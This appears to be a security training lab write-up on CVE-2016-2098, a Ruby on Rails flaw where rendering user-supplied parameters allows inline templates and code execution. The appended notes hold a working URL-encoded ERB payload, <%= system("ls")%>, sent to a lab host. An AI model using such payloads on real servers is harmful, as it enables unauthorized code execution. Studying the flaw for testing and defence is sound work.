Introduction

This course details the exploitation of the vulnerability CVE-2016-2098. This vulnerability is caused by calling the method render on user-supplied data. This issue can be used to gain code execution.

This issue comes from the usage of the render method on user-supplied data. The following code illustrates the problem:

class TestController < ApplicationController
  def show
    render params[:id]
  end
end

The method render is usually used to render a page from a template like in the following code:

class TestController < ApplicationController
  def show
    render 'show'
  end
end

The render method also allows developers to render plain text (plaintext) and even inline code (inline). If you want to jump to exploitation on your own, you can read more about the render method here (https://guides.rubyonrails.org/layouts_and_rendering.html#using-render-with-inline). Then you will need to look at ways to gain code execution using the first example.

Exploitation

If you carefully read the documentation, you can see that the render method accepts inline code. Instead of sending a simple parameter id=test, you can build your request to send a hash: id[inline]=RUBYTEMPLATE. To gain code execution, you just need to find the right value for RUBYTEMPLATE to exec commands. Here you will need to be extra careful with the encoding to get it to work.

Conclusion

This exercise showed you how to exploit CVE-2016-2098 to gain code execution on a server. It's always important to make sure that you check for Array and Hash format in parameters when testing a web application as this may allow you to trigger unexpected behavior.

~~~~~~~~~~~~~~~~~~~~~~~~

http://ptl-3d9163d2-98bf4e21.libcurl.so/pages?id[inline]=test1
renders "test1" on the page

https://stackoverflow.com/questions/3952403/without-equal-in-ruby-erb-means
https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheatsheet.html

http://ptl-3d9163d2-98bf4e21.libcurl.so/pages?id[inline]=%3C%25%3D%20system(%22ls%22)%25%3E
renders "true" on the page

